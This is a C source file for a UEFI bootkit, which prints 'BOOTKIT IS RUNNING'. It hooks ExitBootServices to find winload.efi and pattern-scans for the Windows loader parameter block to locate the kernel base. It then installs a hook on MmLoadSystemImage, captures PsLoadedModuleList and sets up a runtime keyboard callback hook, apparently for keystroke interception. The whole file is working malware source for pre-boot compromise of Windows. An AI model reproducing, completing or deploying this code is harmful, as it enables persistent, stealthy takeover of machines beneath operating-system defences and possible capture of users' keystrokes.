#include "Main.h"
//#include "Hook.h"

VOID DebugCheckAddress(VOID* addr)
{
    EFI_MEMORY_DESCRIPTOR *MemoryMap = NULL;
    UINTN MapSize = 0;
    UINTN MapKey;
    UINTN DescriptorSize;
    UINT32 DescriptorVersion;

    gBS->GetMemoryMap(&MapSize, MemoryMap, &MapKey, &DescriptorSize, &DescriptorVersion);

    MapSize += 0x1000;
    if (EFI_ERROR(gBS->AllocatePool(EfiBootServicesData, MapSize, (VOID**)&MemoryMap))) {
        Print(L"AllocatePool failed\n");
        return;
    }

    if (EFI_ERROR(gBS->GetMemoryMap(&MapSize, MemoryMap, &MapKey, &DescriptorSize, &DescriptorVersion))) {
        Print(L"GetMemoryMap failed\n");
        return;
    }

    EFI_MEMORY_DESCRIPTOR* desc = MemoryMap;

    for (UINTN i = 0; i < MapSize / DescriptorSize; i++) {
        UINT64 start = desc->PhysicalStart;
        UINT64 end   = start + desc->NumberOfPages * 4096;

        if ((UINT64)addr >= start && (UINT64)addr < end) {
            Print(L"\n[FOUND ADDRESS]\n");
            Print(L"Addr = %p\n", addr);
            Print(L"Type = %d\n", desc->Type);
            Print(L"Start = %lx End = %lx\n", start, end);
        }

        desc = (EFI_MEMORY_DESCRIPTOR*)((UINT8*)desc + DescriptorSize);
    }
}

VOID EFIAPI NotifySetVirtualAddressMap(EFI_EVENT Event, VOID* Context)
{
    SerialWrite("winloadVA: ");
    SerialWriteHex(winloadReturnAddress);

    // Sig LogOsLanchScanBase func
    UINT8 sig[] = {0x48, 0xB8, 0x77, 0xBE, 0x9F, 0x1A, 0x2F, 0xDD};
     
    VOID * LogOsLanchScanBase = FindPattern((VOID*)winloadReturnAddress,0x10000,sig,sizeof(sig));

    if (LogOsLanchScanBase) {
        SerialWrite("LogOsLanchScanBase: ");
        SerialWriteHex((UINT64)LogOsLanchScanBase);    
    }
    PLOADER_PARAMETER_BLOCK loaderBlock = *(PLOADER_PARAMETER_BLOCK*)(*(UINT32*)(LogOsLanchScanBase + 0x10) + LogOsLanchScanBase + 0x14); 
    if (NULL == loaderBlock)
    {
        SerialWrite("FUCK loaderBlock\n");
    }
    KLDR_DATA_TABLE_ENTRY *kernelEntery =  CONTAINING_RECORD(loaderBlock->LoadOrderListHead.ForwardLink, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
    if (kernelEntery) {
        SerialWrite("kernel base address: ");
        SerialWriteHex((UINT64)kernelEntery->DllBase);
        SerialWrite("kernel dump: ");
        SerialWriteHex((UINT64)kernelEntery->DllBase);
        VOID* mmLoadAddress = FindNtosExportByName(kernelEntery->DllBase, "MmLoadSystemImage");
        if (mmLoadAddress) {
            SerialWrite("MmLoadSystemImage found, installing hook...\n");
            InstallPureAsmHook(mmLoadAddress);        
        }
    VOID* psListExport = FindNtosExportByName(kernelEntery->DllBase, "PsLoadedModuleList");

    if (psListExport) {
        g_PsLoadedModuleList = (LIST_ENTRY*)psListExport;
        SerialWrite("PsLoadedModuleList found and initialized!\n\r");
    }
    }
    gRT->ConvertPointer(0, (VOID**)&g_TargetKbdAddr);
    gRT->ConvertPointer(0, (VOID**)&g_PsLoadedModuleList);
    g_RuntimeKeyboardHook = (VOID*)MyKeyboardCallbackHook;
    gRT->ConvertPointer(0, &g_RuntimeKeyboardHook);
}


EFI_STATUS EFIAPI HookedExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
{
    // returnAddress is somewhere inside winload.efi!OslFwpKernelSetupPhase1
    winloadReturnAddress = (UINT64)__builtin_return_address(0);
    Print(L"OslFwpKernelSetupPhase1   -> (phys) 0x%p\n", winloadReturnAddress);

    // restore before calling
    gBS->ExitBootServices = originalExitBootServices;

    return originalExitBootServices(ImageHandle, MapKey);
}

EFI_STATUS EFIAPI HookEntryPoint(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
{
    EFI_STATUS status;
    EFI_EVENT event;

    Print(L"\n\n\n");
    Print(L"================================================\n");
    Print(L"          BOOTKIT IS RUNNING                     \n");
    Print(L"          HookEntryPoint executed successfully!  \n");
    Print(L"================================================\n\n");

    gBS = SystemTable->BootServices;

    Print(L"[DEBUG] Checking HookEntry address...\n");
    DebugCheckAddress((VOID*)HookEntry);
    
    status = gBS->CreateEvent(EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE, TPL_NOTIFY, NotifySetVirtualAddressMap, NULL, &event);

    if (EFI_ERROR(status)) {
        Print(L"[-] CreateEventEx failed: %r\n", status);
        return status;
    }
    Print(L"[+] EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE registered\n");

    originalExitBootServices  = gBS->ExitBootServices;
    gBS->ExitBootServices     = HookedExitBootServices;
    Print(L"[+] HookedExitBootServices registered\n");

    return EFI_SUCCESS;
}